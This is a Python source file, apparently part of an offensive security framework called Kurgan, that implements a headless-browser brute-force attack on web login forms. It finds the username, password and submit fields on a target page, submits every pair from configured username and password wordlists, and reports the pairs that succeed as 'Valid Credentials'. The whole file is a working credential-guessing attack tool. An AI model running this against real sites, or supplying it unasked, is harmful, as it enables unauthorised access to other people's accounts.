#!/usr/bin/python3
#Brute force intelligent
#

import time
import re
import sys,os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException

current_dir = os.path.basename(os.getcwd())
if current_dir == "libs":
    sys.path.append('../')
if current_dir == "Kurgan-Framework":
    sys.path.append('./')
    
import config as cf


class BruteForceHeadless(object):
    urlBase = ''
    urlTarget = ''
    driver = ''
    accounts_discovered = []  
        
    def set_urlBase(self, val):
        self.urlBase = val
    def get_urlBase(self):
        return self.urlBase

    def set_urlTarget(self, val):
        self.urlTarget = val
    def get_urlTarget(self):
        return self.urlTarget

    def set_accounts_discovered(self, val):
        self.accounts_discovered.append(val)
    def get_accounts_discovered(self):
        return self.accounts_discovered
    def zera_accounts_discovered(self):
        for i in self.accounts_discovered:
            self.accounts_discovered.remove(i)


    def init_driver(self):
        options = webdriver.ChromeOptions()
        options.binary_location = '/usr/bin/google-chrome'
        options.add_argument('headless')
        driver = webdriver.Chrome(chrome_options=options)
        driver.wait = WebDriverWait(driver, 5)
        return driver
 
    def runBF(self):
        self.zera_accounts_discovered()
        self.driver = self.init_driver()
        self.driver.get(self.urlTarget)
        self.driver.implicitly_wait(4)

        form = self.driver.find_elements_by_tag_name('form')
        for element in form:
            print("method=" + str(element.get_attribute('method')))
            print("action=" + str(element.get_attribute('action')))

        inputs = self.driver.find_elements_by_tag_name('input')
        for element in inputs:
            name = str(element.get_attribute('name'))
            input_type = str(element.get_attribute('type'))
            if input_type == "password":
                password_field = name
                print("password field: " + name)
            if input_type == "submit":
                submit_field = name
                print("submit field: " + name)
            if input_type == "text":
                login_field = name
                print("login field: " + name)

        username = self.driver.find_element_by_name(login_field)
        password = self.driver.find_element_by_name(password_field)

        currDir = cf.KURGAN_HOME #TODO: get real path
        userfile = currDir + cf.BRUTEFORCE_LOGIN_FILE
        passfile = currDir + cf.BRUTEFORCE_PASSWORD_FILE

    
        if userfile is not None and passfile is not None:
            try:
                uFile = open(userfile)
            except OSError as er:
                ferror_msg = []
                ferror_msg.append("Failed to open file: " + userfile)
                return ferror_msg
          

            pFile = open(passfile)

            stop = False
            for usern in uFile.read().split('\n'):
                if stop is True:
                    break
                for passn in pFile.read().split('\n'):
                    if stop is True:
                        break

                    print("Trying with " + usern + "/" + passn)
                    username.send_keys(usern)
                    password.send_keys(passn)
                    self.driver.find_element_by_name(submit_field).click()
                    self.driver.implicitly_wait(1)

                    try:
                        username = self.driver.find_element_by_name(login_field)
                        password = self.driver.find_element_by_name(password_field)
                    except NoSuchElementException as e: 
                        print("Valid Credentials [" + usern + "/" + passn + "]")
                        account = str(usern) + "/" + str(passn)
                        self.accounts_discovered.append(account)
                        stop = True

                pFile.seek(0)
        print("Attack Finished.")
        self.driver.quit()
        return self.accounts_discovered
